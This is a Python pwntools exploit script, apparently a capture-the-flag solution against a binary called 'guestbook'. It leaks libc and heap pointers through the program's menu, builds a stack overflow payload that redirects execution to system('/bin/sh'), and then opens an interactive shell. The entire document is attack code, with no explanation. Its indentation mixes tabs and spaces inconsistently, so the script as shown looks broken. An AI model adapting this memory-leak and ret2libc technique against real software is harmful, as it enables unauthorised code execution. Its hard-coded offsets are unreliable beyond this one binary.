#!/usr/bin/python   
"""
system is at offset 5 from names pointer. Start of names pointer is at offset 6.
"""
from pwn import *

s = process ("./guestbook")

offset = 0x98+4               
bin_sh= 0x14cb22            # offset in libc
#gadget = 0x00000a2a                 # pop edi;
def init():
	for i in range(4):
		s.sendlineafter(">>>", "0000")

def leak_info():
	s.sendlineafter(">>", "1")
	s.sendlineafter(">>>", "6")
        reply = s.recv(24).strip()          
        names_ptr = u32(reply[:4])              #   Pointer to the heap where names_ptr are
        system = u32(reply[20:24])              #   pointer to system is at offset 5
	return system, names_ptr

def exploit(system, bin_sh, heap_ptr):
        s.sendlineafter(">>", "2")
       	s.sendlineafter(">>>", "0")
	payload = "A"*0x4
	payload += "\x00"
	payload += "A"*0x5f
	payload += p32(0x0)
    payload += "BBBB"
	payload += p32(heap_ptr)                #   so that strcpy won't crash
	payload += "B"*(0x9c-len(payload))
        payload += p32(system) + "BBBB" + p32(bin_sh)
        with open("payload.txt", "w") as f:
            f.write(payload)
        s.sendlineafter(">>>", payload)
        s.interactive()

init()
system, names_ptr = leak_info()
log.info("System: {}".format(hex(system)))
log.info("Names_ptr: {}".format(hex(names_ptr)))
log.info("Bin_sh: {}".format(hex(system+bin_sh)))
bin_sh += system
exploit(system, bin_sh, names_ptr)

